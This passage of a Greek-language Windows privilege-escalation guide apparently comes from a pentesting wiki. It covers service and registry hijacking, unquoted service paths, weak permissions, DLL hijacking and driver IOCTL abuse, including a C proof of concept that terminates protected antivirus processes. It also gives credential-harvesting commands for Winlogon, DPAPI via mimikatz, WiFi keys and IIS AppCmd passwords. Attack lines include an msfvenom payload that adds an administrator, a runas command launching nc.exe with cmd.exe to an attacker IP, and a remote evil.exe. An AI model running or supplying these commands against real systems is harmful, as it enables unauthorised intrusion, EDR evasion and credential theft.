Για να αλλάξετε το Path του εκτελούμενου binary:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Δικαιώματα AppendData/AddSubdirectory σε registry υπηρεσιών

Αν έχετε αυτό το δικαίωμα πάνω σε ένα registry αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-registries από αυτό**. Στην περίπτωση των Windows services αυτό είναι **αρκετό για να εκτελέσετε arbitrary code:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Διαδρομές υπηρεσίας χωρίς εισαγωγικά

Εάν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Καταγράψτε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρώντας εκείνες που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες Ανάκτησης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελούνται εάν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Εάν αυτό το binary μπορεί να αντικατασταθεί, μπορεί να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες μπορείτε να βρείτε στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **δικαιώματα των binaries** (ίσως να μπορείτε να overwrite κάποιο και να escalate privileges) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα Εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο config file για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από έναν λογαριασμό Administrator (schedtasks).

Ένας τρόπος για να βρείτε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι να κάνετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που θα εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες τοποθεσίες autoruns για κλιμάκωση προνομίων:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Οι σύγχρονες ευπάθειες στα hive επιτρέπουν να διαμορφώσεις deterministic layouts, να καταχραστείς writable HKLM/HKU descendants και να μετατρέψεις metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Κάποιοι signed third‑party drivers δημιουργούν το device object με ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να ορίσουν FILE_DEVICE_SECURE_OPEN στα DeviceCharacteristics. Χωρίς αυτή τη σημαία, το secure DACL δεν εφαρμόζεται όταν η συσκευή ανοίγεται μέσω μιας διαδρομής που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιοδήποτε unprivileged χρήστη να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Μόλις ένας χρήστης μπορεί να ανοίξει τη συσκευή, privileged IOCTLs που εκτίθενται από τον driver μπορούν να καταχραστούν για LPE και tampering. Παραδείγματα δυνατοτήτων που παρατηρήθηκαν στο wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Μέτρα μετριασμού για προγραμματιστές
- Πάντα ορίστε FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε device objects που προορίζονται να περιοριστούν από μια DACL.
- Επαληθεύστε το caller context για privileged operations. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε process termination ή handle returns.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για direct kernel privileges.

Ιδέες ανίχνευσης για τους αμυντικούς
- Παρακολουθείτε user-mode opens για ύποπτα device names (e.g., \\ .\\amsdk*) και συγκεκριμένες IOCTL sequences που υποδηλώνουν κατάχρηση.
- Εφαρμόστε το Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) και διατηρείστε τα δικά σας allow/deny lists.


## PATH DLL Hijacking

Εάν έχετε **write permissions inside a folder present on PATH** μπορεί να καταφέρετε να hijack μια DLL που φορτώνεται από μια διεργασία και να **escalate privileges**.

Ελέγξτε τα permissions όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερα[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το δυαδικό `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Εάν αποκτήσετε root user, μπορείτε να ακούσετε σε οποιοδήποτε port (την πρώτη φορά που θα χρησιμοποιήσετε `nc.exe` για να ακούσει σε ένα port θα ρωτήσει μέσω GUI αν `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το filesystem του `WSL` στο φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Διαχείριση Credentials / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει τα διαπιστευτήρια χρηστών για servers, websites και άλλα προγράμματα που τα **Windows** μπορούν να **συνδέσουν αυτόματα τους χρήστες**. Σε πρώτη ανάγνωση, αυτό μπορεί να μοιάζει σαν να μπορούν τώρα οι χρήστες να αποθηκεύουν τα διαπιστευτήριά τους για Facebook, Twitter, Gmail κ.λπ., έτσι ώστε να συνδέονται αυτόματα μέσω των browsers. Όμως δεν είναι έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια που τα Windows μπορούν να χρησιμοποιήσουν για να συνδέουν αυτόματα τους χρήστες, πράγμα που σημαίνει ότι οποιαδήποτε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για να έχει πρόσβαση σε έναν πόρο** (server ή website) **μπορεί να κάνει χρήση αυτού του Credential Manager** & Windows Vault και να χρησιμοποιήσει τα αποθηκευμένα διαπιστευτήρια αντί οι χρήστες να εισάγουν συνέχεια το username και το password.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με τον Credential Manager, δεν νομίζω ότι είναι δυνατό να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιο τρόπο **να επικοινωνήσει με τον credential manager και να ζητήσει τα διαπιστευτήρια για εκείνον τον πόρο** από το προεπιλεγμένο storage vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα credentials. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι εργαλεία όπως mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ή από το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Η **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ιδιωτικών ασύμμετρων κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος που συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα διαπιστευτήρια σύνδεσης του χρήστη**. Σε σενάρια κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά πιστοποίησης domain του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, χρησιμοποιώντας το DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Το DPAPI key, που βρίσκεται μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, αποτελείται συνήθως από 64 bytes τυχαίων δεδομένων. (Σημαντικό είναι ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την απαρίθμηση του περιεχομένου του μέσω της εντολής `dir` στο CMD, αν και μπορεί να απαριθμηθεί μέσω του PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα επιχειρήματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Οι **credentials files protected by the master password** βρίσκονται συνήθως στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
Μπορείς να χρησιμοποιήσεις **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσεις.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).
Μπορείς να **εξάγεις πολλά DPAPI** **masterkeys** από τη **μνήμη** με το `sekurlsa::dpapi` module (αν είσαι root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell διαπιστευτήρια

**PowerShell credentials** are often used for **scripting** and automation tasks as a way to store encrypted credentials conveniently.
**PowerShell διαπιστευτήρια** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματισμού, ως ένας τρόπος για να αποθηκεύονται κρυπτογραφημένα διαπιστευτήρια με ευκολία. Τα διαπιστευτήρια προστατεύονται χρησιμοποιώντας **DPAPI**, που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

To **decrypt** a PS credentials from the file containing it you can do:
Για να **αποκρυπτογραφήσεις** ένα PS διαπιστευτήριο από το αρχείο που το περιέχει μπορείς να κάνεις:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τα βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής Διαπιστευτηρίων Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε .rdg αρχεία**\
Μπορείτε να **εξάγετε πολλούς DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Συχνά οι χρήστες χρησιμοποιούν την εφαρμογή StickyNotes σε υπολογιστές με Windows για να **αποθηκεύουν κωδικούς** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι πρόκειται για αρχείο βάσης δεδομένων. Το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητήσετε και να το εξετάσετε.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς από το AppCmd.exe πρέπει να είστε Administrator και να τρέχετε σε επίπεδο High Integrity.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\` directory.\
Εάν αυτό το αρχείο υπάρχει, τότε είναι πιθανό ότι κάποιες **credentials** έχουν ρυθμιστεί και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι εγκαταστάτες **εκτελούνται με προνόμια SYSTEM**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Μητρώο (Διαπιστευτήρια)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys στο registry

Μπορεί να υπάρχουν αποθηκευμένα SSH private keys στο registry key `HKCU\Software\OpenSSH\Agent\Keys`, οπότε πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε εγγραφή μέσα σε αυτό το μονοπάτι, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν τρέχει και θέλετε να ξεκινάει αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με `ssh-add` και να συνδεθώ μέσω ssh σε μια μηχανή. Το μητρώο HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρα κλειδιά.
  
### Ανεπιτήρητα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Αποθηκευμένος κωδικός GPP

Παλιότερα υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε ένα σύνολο μηχανημάτων μέσω Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά προβλήματα ασφάλειας. Πρώτον, τα Group Policy Objects (GPOs), που αποθηκεύονται ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain χρήστη. Δεύτερον, οι κωδικοί μέσα σε αυτά τα GPPs, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό δημιουργούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν αυξημένα προνόμια.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια συνάρτηση που σαρώνει για τοπικά αποθηκευμένα GPP αρχεία που περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Όταν βρεθεί τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό και επιστρέφει ένα προσαρμοσμένο PowerShell αντικείμενο. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, βοηθώντας στην ταυτοποίηση και την αποκατάσταση αυτής της ευπάθειας ασφάλειας.

Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ αυτά τα αρχεία:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
